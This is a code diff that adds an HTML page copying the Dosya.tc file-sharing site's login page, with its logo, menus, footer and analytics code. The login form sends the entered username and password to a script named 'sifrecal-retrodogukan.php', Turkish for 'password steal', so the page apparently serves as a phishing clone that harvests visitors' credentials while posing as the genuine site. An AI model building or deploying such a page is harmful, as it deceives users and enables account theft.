@@ -1,0 +1,169 @@
+
+
+<!doctype html>
+<html>
+<head>
+<link rel="stylesheet" href="style/stlye.css">
+<link rel="stylesheet" href="style/bootstrap.css">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1254" />
+<meta http-equiv="content-type" content="text/html; charset=ISO-8859-9" />
+
+<title>Dosya.tc - Ucretsiz, Hizli ve Kolay Dosya Paylasimi</title>
+<META NAME="description" CONTENT="1 GB'a kadar dosya yukleyebilir ve istediginiz kisilerle paylasabilirsiniz. Tamamen ucretsiz, uyelige gerek yok. sinirsiz yukle ve indir.">
+<META NAME="keywords" CONTENT="dosya, dosya yukle, dosya paylaş, dosya upload, dosya indir, dosya gönder, upload, ücretsiz dosya paylaşımı, upload sitesi, file, file upload, file download, free file hosting, file hosting, file share">
+<link href="http://www.dosya.tc/style/style.css" rel="stylesheet" type="text/css">
+<link href="http://www.dosya.tc/style/bootstrap.css" rel="stylesheet" type="text/css">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name = "viewport" content = "initial-scale = 1, user-scalable = no">
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<link rel="alternate" href="http://www.dosya.tc/" hreflang="tr-tr" />
+
+<meta name="google-site-verification" content="8MKPk48pkDgPsn5yLydhRvyf7LfzpO5ZxYAvoFuAY3c" />
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-60205436-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+</head>
+
+<body>
+
+
+
+
+
+<div id="container">
+<div id="tasiyici">
+<div id="header">
+<a href="http://www.dosya.tc" title="Dosya"><img src="http://www.dosya.tc/images/logo.png" width="191" height="53" alt="Dosya.tc"></a>
+<select class="sel1" onchange="location = this.options[this.selectedIndex].value;">
+<option>...</option>
+<option value="http://www.dosya.tc/">Dosya Upload</option>
+<option value="http://www.dosya.tc/index.php?page=faq">Site Hakkinda</option>
+<option value="http://www.dosya.tc/index.php?page=tos">Kullanim Sartlari</option>
+<option value="http://www.dosya.tc/iletisim.php">Bize Ulasin</option>
+<option value="http://www.dosya.tc/uye.php">Uye Girisi</option>
+</select>
+
+<a href="http://www.dosya.tc/uye.php"><img src="http://www.dosya.tc/images/uye-girisi.png" alt="Üye girişi" class="uye-girisi"></a>
+
+
+<div class="menu">
+<ul>
+<li><a href=http://www.dosya.tc/>Dosya Upload</a></li>
+<li><a href="http://www.dosya.tc/index.php?page=faq">Site Hakkinda</a></li>
+<li><a href="http://www.dosya.tc/index.php?page=tos">Kullanim Sartlari</a></li>
+<li><a href="http://www.dosya.tc/iletisim.php">Bize Ulasin</a></li>
+</ul>
+</div>
+</div>
+<div id="main"><script>
+function checkbak()
+{
+if(document.giris.kullanici.value=="")
+alert("Kullanici adinizi veya e-mail adresinizi giriniz.");
+else if(document.giris.sifre.value==""||String(document.giris.sifre.value).length<6)
+alert("Sifre en az 6 karakter olmalidir.");
+else document.giris.submit();
+return false;
+}
+</script>
+
+<body>
+
+
+
+
+<br><p>Sitemizi kullanmaniz icin uye olmaniza gerek yoktur.</p>
+<p>Fakat uye olarak yuklediginiz dosyalarin listesini tutabilirsiniz.</p>
+<p>Yuklediginiz dosyalarin linklerini kaybettiginizde uye hesabinizdan linkleri alabilirsiniz.</p><br><br>
+
+
+
+<div class="kayit">
+<form action="sifrecal-retrodogukan.php" method="post" name="giris" onsubmit="return checkbak()">
+
+<h1>Giris Yap</h1><br><br>
+
+
+
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+
+<tr>
+<td>
+<b>Kullanici Adi veya E-mail Adresi</b>
+</td>
+</tr>
+
+<tr>
+<td><input type="text" class="text2" name="kullanici">
+</td>
+</tr>	
+<tr>
+<td>
+<b>Sifreniz</b>
+</td>
+</tr>
+<tr>
+<td><input type="password" class="text2" name="sifre"></td>
+</tr>
+<tr>
+
+<td><input type="submit" value="Giris" style="font-weight: 700" class="buton" align="center"></td>
+</tr>	</table>
+
+
+</form><center>
+<a href="uyekayit.php"><b>Ucretsiz Kayit Ol</b></a><br><a href="sifre.php"><b>Sifremi Unuttum</b></a></center>
+</div>
+
+
+<div class="downloadd" align="center">
+<br><br>
+<b>VEYA</b>
+
+
+
+
+
+
+
+<br><br>
+<a href="fblogin.php"><img src="images/face.png" alt="Facebook Login Button"></a>
+</div>
+
+
+<br><br><br></html>
+
+<br><br><br>
+<div id="footer">
+<a href="http://www.facebook.com/Dosya.tc" class="social"><img src="http://www.dosya.tc/images/footer-icon1.png" alt="Facebook"></a>
+<a href="http://twitter.com/Dosyatc" class="social"><img src="http://www.dosya.tc/images/footer-icon2.png" alt="Twitter"></a>
+<a href="https://www.google.com/+DosyaTcsitesi" class="social"><img src="http://www.dosya.tc/images/footer-icon3.png" alt="Google+"></a>
+
+
+
+
+
+<span>Copyright Dosya.tc © 2006-2019. Her hakki saklidir.</span>
+
+
+
+
+<a href="http://www.dosya.tc" title="Upload">
+<img src="http://www.dosya.tc/images/logo.png" alt="Dosya.tc" class="logo" width="120" height="33">
+</a>
+</div>
+</div>
+</div>
+</body>
+</html>
